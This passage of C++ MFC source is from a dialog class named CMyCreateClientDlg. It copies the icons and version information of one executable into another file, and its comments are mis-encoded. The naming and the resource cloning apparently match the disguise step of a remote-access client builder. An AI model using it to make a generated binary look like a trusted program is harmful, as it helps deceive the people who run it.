	if(m_CurSorStatus)
	{
		SetCursor(GetWaitCursor());
		return TRUE;
	}
	return CDialog::OnSetCursor(pWnd, nHitTest, message);
}

LRESULT CMyCreateClientDlg::OnSetMyCursor(WPARAM wParam, LPARAM lParam)
{
	if(wParam)
	{
		m_CurSorStatus = TRUE;
		PostMessage(WM_SETCURSOR, 0, 0);
	}
	else
	{
		m_CurSorStatus = FALSE;
		PostMessage(WM_SETCURSOR, 0, 0);
	}
	return TRUE;
}

BOOL UpdateFileResource(TCHAR* pFileName, TCHAR* lpType, TCHAR* lpName, LPVOID pData, DWORD nLen)
{
	//��ʼ�滻��Դ
	HANDLE hFile = BeginUpdateResource(pFileName, FALSE);
	if(hFile == NULL)
	{
		return FALSE;
	}

	//�����ļ�
	if(!UpdateResource(hFile, lpType, lpName, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), pData,nLen))
	{
		return FALSE;
	}

	//������Դ
	return EndUpdateResource(hFile, FALSE);
}

BOOL CALLBACK EnumResNameProc(
  HMODULE hModule,   // module handle
  LPCTSTR lpszType,  // resource type
  LPTSTR lpszName,   // resource name
  LONG_PTR lParam    // application-defined parameter
)
{
	LPEXEDLLICONINFO pInfo = (LPEXEDLLICONINFO) lParam;

	HRSRC        	hRsrc = NULL;
    HGLOBAL        	hGlobal = NULL;
    LPMEMICONDIR    lpIcon = NULL;

    if((hRsrc = FindResource(pInfo->hInstance, lpszName, RT_GROUP_ICON )) == NULL )
    {
         return TRUE;
    }

    if((hGlobal = LoadResource( pInfo->hInstance, hRsrc)) == NULL )
    {
         return TRUE;
    }

    if((lpIcon = (LPMEMICONDIR) LockResource(hGlobal)) == NULL )
    {
         return TRUE;
    }

	UpdateFileResource(pInfo->szFileName, RT_GROUP_ICON, lpszName, lpIcon, SizeofResource(pInfo->hInstance, hRsrc));

	for(int i = 0; i < lpIcon->idCount; i++)
	{
		if((hRsrc = FindResource(pInfo->hInstance, MAKEINTRESOURCE(lpIcon->idEntries[i].nID), RT_ICON)) == NULL )
		{
			return TRUE;
		}

		if( (hGlobal = LoadResource( pInfo->hInstance, hRsrc )) == NULL )
		{
			return TRUE;
		}
		UpdateFileResource(pInfo->szFileName, RT_ICON, 
			MAKEINTRESOURCE(lpIcon->idEntries[i].nID), LockResource(hGlobal), SizeofResource(pInfo->hInstance, hRsrc));
	}
	return TRUE;
}

void CMyCreateClientDlg::UpdateIcon(LPCTSTR pSrcFileName, TCHAR* pDesFileName)
{
 	EXEDLLICONINFO m_Info = {0};
	lstrcpy(m_Info.szFileName, pDesFileName);
	if((m_Info.hInstance = LoadLibraryEx(pSrcFileName, NULL, LOAD_LIBRARY_AS_DATAFILE )) == NULL )
	{
		return;
	}

	CWaitCursor m_Cur;

	//���°汾��Ϣ
	HRSRC   hRsrc = NULL;
    HGLOBAL hGlobal = NULL;
    if((hRsrc = FindResource(m_Info.hInstance, MAKEINTRESOURCE(1), RT_VERSION)) != NULL )
    {
		if((hGlobal = LoadResource(m_Info.hInstance, hRsrc)) != NULL )
		{
			UpdateFileResource(pDesFileName, RT_VERSION, MAKEINTRESOURCE(1), 
			LockResource(hGlobal), SizeofResource(m_Info.hInstance, hRsrc));
		}
    }
 
	//����ͼ����Ϣ
	EnumResourceNames(m_Info.hInstance, RT_GROUP_ICON, EnumResNameProc, (LPARAM) &m_Info);
	m_Cur.Restore();
}

